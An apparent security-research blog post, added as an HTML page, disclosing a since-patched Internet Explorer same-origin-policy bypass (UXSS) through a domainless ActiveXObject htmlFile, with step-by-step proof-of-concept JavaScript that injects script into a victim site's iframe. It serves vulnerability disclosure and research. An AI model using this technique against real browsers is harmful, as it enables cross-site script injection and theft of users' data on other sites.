@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SOP bypass / UXSS - More Adventures in a Domainless World (IE) | BrokenBrowser - Fun with browser vulnerabilities</title>
+<meta name="keywords" content="">
+<meta name="description" content="A few months ago we’ve been playing with domainless about:blank pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was recently patched as CVE-2017-0002 so it does not work anymore. The same thing happens with the ActiveXObject/htmlFile (from now on, htmlFile) which was patched last week as CVE-2017-0154.
+If you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them.">
+<meta name="author" content="magicmac">
+<link rel="canonical" href="/posts/uxss-ie-domainless-world/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6a98292fb8fa8cf0f3ba4042d4b75515c04267550f3ad49ff6271b5af9562443.css" integrity="sha256-apgpL7j6jPDzukBC1LdVFcBCZ1UPOtSf9icbWvlWJEM=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SOP bypass / UXSS - More Adventures in a Domainless World (IE)" />
+<meta property="og:description" content="A few months ago we’ve been playing with domainless about:blank pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was recently patched as CVE-2017-0002 so it does not work anymore. The same thing happens with the ActiveXObject/htmlFile (from now on, htmlFile) which was patched last week as CVE-2017-0154.
+If you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/uxss-ie-domainless-world/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2017-03-20T01:19:12-03:00" />
+<meta property="article:modified_time" content="2017-03-20T01:19:12-03:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SOP bypass / UXSS - More Adventures in a Domainless World (IE)"/>
+<meta name="twitter:description" content="A few months ago we’ve been playing with domainless about:blank pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was recently patched as CVE-2017-0002 so it does not work anymore. The same thing happens with the ActiveXObject/htmlFile (from now on, htmlFile) which was patched last week as CVE-2017-0154.
+If you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "/posts/"
+    }
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "SOP bypass / UXSS - More Adventures in a Domainless World (IE)",
+      "item": "/posts/uxss-ie-domainless-world/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SOP bypass / UXSS - More Adventures in a Domainless World (IE)",
+  "name": "SOP bypass \/ UXSS - More Adventures in a Domainless World (IE)",
+  "description": "A few months ago we’ve been playing with domainless about:blank pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was recently patched as CVE-2017-0002 so it does not work anymore. The same thing happens with the ActiveXObject/htmlFile (from now on, htmlFile) which was patched last week as CVE-2017-0154.\nIf you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them.",
+  "keywords": [
+    
+  ],
+  "articleBody": "A few months ago we’ve been playing with domainless about:blank pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was recently patched as CVE-2017-0002 so it does not work anymore. The same thing happens with the ActiveXObject/htmlFile (from now on, htmlFile) which was patched last week as CVE-2017-0154.\nIf you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them. Thanks bug hunter!\nOur goal today is to port our original Edge bug to Internet Explorer, which should be an easy task considering that Microsoft halfheartedly patches IE. Take a look at the current state of both bugs:\nCreate a domainless about:blank on IE In the original bug, we were using a data: uri to create the domainless blank, how can we achieve the same on IE? Well, htmlFile comes to the rescue again, because the patch does not allow us to set an arbitrary domain anymore, but we can still set a it to blank, or, domainless.\nTo create a domainless htmlFile we first need a destroyed document, in other words, a document that does not exist anymore. And how can we create something out of nothing? That’s more of a question for Neil deGrasse Tyson, but I’ll do my best to reply! 🙂\nThe idea is simple in reality. We just need to make sure that things happen in the correct order.\nBug hunter, we’ve seen this blocking-thread idea in the past (check at the very bottom of that post) which can be used to create a vast amount of vulnerabilities. The blocking thread technique that we will use below is a very visible, bold alert. This way we won’t be feeding real attackers, or at least they will have to find a solution by themselves to make this PoC completely invisible. Take a look at the code below.\nDomainless htmlFile // We will attack the iframe below // // Render an iframe (we will destroy its document later) document.body.insertAdjacentHTML('beforeEnd',''); // Save a reference to its ActiveXObject var ifr_ActiveXObject = ifr.ActiveXObject; // Make sure IE does not invalidate our reference new ifr_ActiveXObject(\"htmlFile\"); // We don't even need save this instance // Block the iFrame so the ActiveXObject object is never destroyed ifr.setTimeout('alert(\"Do not close me until the PoC finishes, please.\");'); Have you realized that we used a setTimeout to execute the blocking alert? That’s because we still need to continue doing things, and if we do the alert directly on the iframe, it will block the UI and not execute what’s coming below. Our goal now is to destroy the contents of the iframe while the blocking alert remains there. Remember that the alert is what prevents IE from destroying the ActiveXObject.\nNow we will destroy the document of the iframe and create the domainless htmlFile. If document.open is unfamiliar to you, for this PoC you can think of it as if it were a document.write.\n// Destroy the iframe document ifr.document.open(); // Instantiate a domainless htmlFile var domainlessDoc = new ifr_ActiveXObject(\"htmlFile\"); Excellent! At this point we have now a our domainless htmlFile. All we need to do now is load an iframe with the URL that we want to access, and bingo! The exact details on how to do this are described in the original adventures in a domainless world post. But essentially, we are loading any site with iframes and changing any of them to an about:blank (which belongs to the iframe domain). Then, we can freely access this blank (bypassing the SOP) from our domainless htmlFile.\n// Inject the code in victim's inner iframe domainlessDoc.parentWindow.setTimeout(\"victim_iframe[0].location = 'javascript:alert(parent.document.domain);'\"); Want to see this in action? This one works straight out of the box on IE10 and IE11, but with a little tweak it should work also from IE6 to IE11 . We won’t tweak it here but if you are curious, let me know.\n[ Patched on 2017-04-11 ]\n[ Check out the PoC Live on IE10 or IE11 ] Bug hunter, let me remind you that the htmlFile still has tons of things to discover. I believe it’s worth spending a rainy afternoon researching on it!\nIn my opinion, the best way to patch all htmlFile related bugs is by completely disabling its instantiation from iexplore.exe. Unfortunately I don’t have the big picture and I imagine there’s a good reason to keep it alive, but honestly, I don’t know how in the world developers will patch it. There are too many things that are beyond IE awareness once this object is instantiated.\n// If this code returns ACCESS_DENIED attackers will lose an amazing weapon new ActiveXObject(\"htmlFile\"); // Do not allow this anymore! Have a nice day!\nManuel.\n",
+  "wordCount" : "843",
+  "inLanguage": "en",
+  "datePublished": "2017-03-20T01:19:12-03:00",
+  "dateModified": "2017-03-20T01:19:12-03:00",
+  "author":{
+    "@type": "Person",
+    "name": "magicmac"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/posts/uxss-ie-domainless-world/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BrokenBrowser - Fun with browser vulnerabilities",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="/" accesskey="h" title="BrokenBrowser - Fun with browser vulnerabilities (Alt + H)">BrokenBrowser - Fun with browser vulnerabilities</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      SOP bypass / UXSS - More Adventures in a Domainless World (IE)
+    </h1>
+    <div class="post-meta"><span title='2017-03-20 01:19:12 -0300 -03'>March 20, 2017</span>&nbsp;·&nbsp;magicmac
+
+</div>
+  </header> 
+  <div class="post-content"><p>A few months ago we’ve been playing with <a href="https://www.brokenbrowser.com/uxss-edge-domainless-world/">domainless about:blank</a> pages on Edge. Essentially, a powerful about:blank document was capable of accessing every domain without restrictions. It was <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0002">recently patched as CVE-2017-0002</a> so it does not work anymore. The same thing happens with the <a href="https://www.brokenbrowser.com/uxss-ie-htmlfile/">ActiveXObject/htmlFile</a> (from now on, <strong>htmlFile</strong>) which was <a href="https://technet.microsoft.com/library/security/MS17-006">patched last week</a> as <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0154">CVE-2017-0154</a>.</p>
+<p>If you haven’t read those two methods to achieve UXSS/SOP bypass, please do it now because what’s coming assumes that we are familiar with them. Thanks bug hunter!</p>
+<p>Our goal today is to <strong>port our original Edge bug to Internet Explorer</strong>, which should be an easy task considering that <a href="https://www.brokenbrowser.com/on-patching-security-bugs/">Microsoft halfheartedly patches IE</a>. Take a look at the current state of both bugs:</p>
+<p><img loading="lazy" src="/2017/03/01-patched-bugs-1.png" alt=""  />
+</p>
+<h3 id="create-a-domainless-aboutblank-on-ie">Create a domainless about:blank on IE<a hidden class="anchor" aria-hidden="true" href="#create-a-domainless-aboutblank-on-ie">#</a></h3>
+<p>In the original bug, we were using a data: uri to create the domainless blank, how can we achieve the same on IE? Well, htmlFile comes to the rescue again, because the patch does not allow us to set an arbitrary domain anymore, but we can still set a it to blank, or, domainless.</p>
+<p>To create a domainless htmlFile we first need a destroyed document, in other words, a document that does not exist anymore. And how can we create something out of nothing? That’s more of a question for <a href="https://twitter.com/neiltyson">Neil deGrasse Tyson</a>, but I’ll do my best to reply! 🙂</p>
+<p>The idea is simple in reality. We just need to make sure that things happen in the correct order.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>Bug hunter, we’ve seen this blocking-thread idea <a href="https://www.brokenbrowser.com/uxss-ie-htmlfile/">in the past</a> (check at the very bottom of that post) which can be used to create a vast amount of vulnerabilities. The blocking thread technique that we will use below is a very visible, bold alert. This way we won’t be feeding real attackers, or at least they will have to find a solution by themselves to make this PoC completely invisible. Take a look at the code below.</p>
+<h3 id="domainless-htmlfile">Domainless htmlFile<a hidden class="anchor" aria-hidden="true" href="#domainless-htmlfile">#</a></h3>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false nums-toggle:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Domainless about:blank&#34;&gt;// We will attack the iframe below
+// &lt;iframe name=&#34;victim_iframe&#34; src=&#34;https://www.google.com/recaptcha/...&#34;&gt;&lt;/iframe&gt;
+
+// Render an iframe (we will destroy its document later)
+document.body.insertAdjacentHTML(&#39;beforeEnd&#39;,&#39;&lt;iframe name=&#34;ifr&#34;&gt;&lt;/iframe&gt;&#39;);
+
+// Save a reference to its ActiveXObject
+var ifr_ActiveXObject = ifr.ActiveXObject;
+
+// Make sure IE does not invalidate our reference
+new ifr_ActiveXObject(&#34;htmlFile&#34;); // We don&#39;t even need save this instance
+
+// Block the iFrame so the ActiveXObject object is never destroyed
+ifr.setTimeout(&#39;alert(&#34;Do not close me until the PoC finishes, please.&#34;);&#39;);
+</code></pre><p>Have you realized that we used a setTimeout to execute the blocking alert? That’s because we still need to continue doing things, and if we do the alert directly on the iframe, it will block the UI and not execute what’s coming below. Our goal now is to destroy the contents of the iframe <!-- raw HTML omitted -->while the blocking alert remains there.<!-- raw HTML omitted --> Remember that the alert is what prevents IE from destroying the ActiveXObject.</p>
+<p>Now we will destroy the document of the iframe and create the domainless htmlFile. If document.open is unfamiliar to you, for this PoC you can think of it as if it were a document.write.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false nums-toggle:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Create the domainless htmlFile&#34;&gt;// Destroy the iframe document
+ifr.document.open();
+
+// Instantiate a domainless htmlFile
+var domainlessDoc = new ifr_ActiveXObject(&#34;htmlFile&#34;);
+</code></pre><p>Excellent! At this point we have now a our domainless htmlFile. All we need to do now is load an iframe with the URL that we want to access, and bingo! The exact details on how to do this are described in the <a href="https://www.brokenbrowser.com/uxss-edge-domainless-world/">original adventures in a domainless world</a> post. But essentially, we are loading any site with iframes and changing any of them to an about:blank (which belongs to the iframe domain). Then, we can freely access this blank (bypassing the SOP) from our domainless htmlFile.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false nums-toggle:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Access the domained blank iframe&#34;&gt;// Inject the code in victim&#39;s inner iframe
+domainlessDoc.parentWindow.setTimeout(&#34;victim_iframe[0].location = &#39;javascript:alert(parent.document.domain);&#39;&#34;);
+</code></pre><p>Want to see this in action? This one works straight out of the box on IE10 and IE11, but with a little tweak it should work also from IE6 to IE11 . We won’t tweak it here but if you are curious, <a href="https://twitter.com/magicmac2000">let me know</a>.</p>
+<p><a href="/wp-content/uploads/2017/03/02-xdom-poc.png" title="PoC on google.com"><img loading="lazy" src="/2017/03/02-xdom-poc.png" alt=""  />
+</a><strong>[ Patched on 2017-04-11 ]</strong></p>
+<h2 id="-check-out-the-poc-live-on-ie10-or-ie11httpwwwcrackingcomardemosieuxssdomainless-">[ <a href="http://www.cracking.com.ar/demos/ieuxssdomainless">Check out the PoC Live on IE10 or IE11</a> ]<a hidden class="anchor" aria-hidden="true" href="#-check-out-the-poc-live-on-ie10-or-ie11httpwwwcrackingcomardemosieuxssdomainless-">#</a></h2>
+<p>Bug hunter, let me remind you that the htmlFile still has tons of things to discover. I believe it’s worth spending a rainy afternoon researching on it!</p>
+<p>In my opinion, the best way to patch all htmlFile related bugs is by completely disabling its instantiation <!-- raw HTML omitted -->from iexplore.exe<!-- raw HTML omitted -->. Unfortunately I don’t have the big picture and I imagine there’s a good reason to keep it alive, but honestly, I don’t know how in the world developers will patch it. There are too many things that are beyond IE awareness once this object is instantiated.</p>
+<pre tabindex="0"><code>&lt;pre class=&#34;theme:vs2012-black toolbar:2 nums:false nums-toggle:false whitespace-before:1 whitespace-after:1 lang:js decode:true&#34; title=&#34;Create the domainless htmlFile&#34;&gt;// If this code returns ACCESS_DENIED attackers will lose an amazing weapon
+new ActiveXObject(&#34;htmlFile&#34;);  // Do not allow this anymore!
+</code></pre><p>Have a nice day!<br>
+<a href="https://twitter.com/magicmac2000">Manuel.</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="/">BrokenBrowser - Fun with browser vulnerabilities</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
